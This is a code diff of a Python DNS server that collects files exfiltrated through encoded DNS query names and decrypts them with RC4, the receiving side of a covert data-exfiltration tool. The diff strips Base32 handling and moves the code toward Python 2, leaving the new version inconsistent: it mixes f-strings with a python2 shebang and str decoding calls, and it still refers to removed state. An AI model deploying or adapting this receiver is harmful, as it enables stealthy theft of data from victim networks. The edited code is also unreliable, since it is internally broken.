@@ -1,9 +1,9 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 import argparse
 import socket
 from dnslib import DNSRecord, DNSHeader, RR, QTYPE, TXT
-from base64 import b64decode, b32decode
+from base64 import b64decode
 import sys
 
 #======================================================================================================
@@ -15,7 +15,7 @@ import sys
 #------------------------------------------------------------------------
 class RC4:
     def __init__(self, key=None):
-        self.state = list(range(256))  # initialization of the permutation table
+        self.state = range(256)  # initialization of the permutation table
         self.x = self.y = 0  # the indices x and y, instead of i and j
 
         if key is not None:
@@ -25,19 +25,19 @@ class RC4:
     # Key schedule
     def init(self, key):
         for i in range(256):
-            self.x = int(str(key[i % len(key)]) + str(self.state[i]) + str(self.x)) & 0xFF
+            self.x = (self.x + ord(key[i % len(key)]) + self.state[i]) % 256
             self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
         self.x = 0
 
     # Decrypt binary input data
     def binaryDecrypt(self, data):
-        output = [None]*len(data)
+        output = [None] * len(data)
         for i in range(len(data)):
-            self.x = (self.x + 1) & 0xFF
-            self.y = (self.state[self.x] + self.y) & 0xFF
+            self.x = (self.x + 1) % 256
+            self.y = (self.state[self.x] + self.y) % 256
             self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
-            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
-        return bytearray(output)
+            output[i] = (ord(data[i]) ^ self.state[(self.state[self.x] + self.state[self.y]) % 256])
+        return ''.join(chr(x) for x in output)
 
 #------------------------------------------------------------------------
 def progress(count, total, status=''):
@@ -63,28 +63,17 @@ def fromBase64URL(msg):
         return b64decode(msg)
 
 #------------------------------------------------------------------------
-def fromBase32(msg):
-    # Base32 decoding, we need to add the padding back
-    # Add padding characters
-    mod = len(msg) % 8
-    padding = "=" * (-len(msg) % 8)  # Pad with '=' to make the length a multiple of 8
-    return b32decode(msg.upper() + padding)
-
-#------------------------------------------------------------------------
 def color(string, color=None):
     """
     Change text color for the Linux terminal.
     """
-    
-    attr = ['1']  # bold
     if color:
         if color.lower() == "red":
-            attr.append('31')
+            return '\x1b[1;31m{}\x1b[0m'.format(string)  # bold and red
         elif color.lower() == "green":
-            attr.append('32')
+            return '\x1b[1;32m{}\x1b[0m'.format(string)  # bold and green
         elif color.lower() == "blue":
-            attr.append('34')
-        return '\x1b[{}m{}\x1b[0m'.format(';'.join(attr), string)
+            return '\x1b[1;34m{}\x1b[0m'.format(string)  # bold and blue
     else:
         if string.strip().startswith("[!]"):
             return '\x1b[1;31m{}\x1b[0m'.format(string)  # bold and red
@@ -117,7 +106,7 @@ if __name__ == '__main__':
     try:
         useBase32 = False
         chunkIndex = 0
-        fileData = bytearray()
+        fileData = ''
 
         while True:
             data, addr = udps.recvfrom(1024)
@@ -131,19 +120,9 @@ if __name__ == '__main__':
                 if qname.upper().startswith("INIT."):
                     msgParts = qname.split(".")
                     
-                    msg = fromBase32(msgParts[1]).decode('utf-8')
+                    msg = fromBase64URL(msgParts[1]).decode('utf-8')
                     fileName, nbChunks = msg.split('|')  # Name of the file and number of chunks
                     nbChunks = int(nbChunks)  # Convert string to int
-
-                    if msgParts[2].upper() == "BASE32":
-                        useBase32 = True
-                        print(color("[+] Data was encoded using Base32"))
-                    else:
-                        print(color("[+] Data was encoded using Base64URL"))
-
-                    # Reset all variables
-                    fileData = bytearray()
-                    chunkIndex = 0
 
                     print(color(f"[+] Receiving file [{fileName}] as a ZIP file in [{nbChunks}] chunks"))
 
@@ -159,7 +138,7 @@ if __name__ == '__main__':
 
                     #---- Is this the chunk of data we're expecting?
                     if int(chunkNumber) == chunkIndex:
-                        fileData += rawData.replace('.', '').encode()
+                        fileData += rawData.replace('.', '').decode('utf-8')
                         chunkIndex += 1
                         progress(chunkIndex, nbChunks, "Receiving file")
 
@@ -192,3 +171,4 @@ if __name__ == '__main__':
     finally:
         print(color("[!] Stopping DNS Server"))
         udps.close()
+
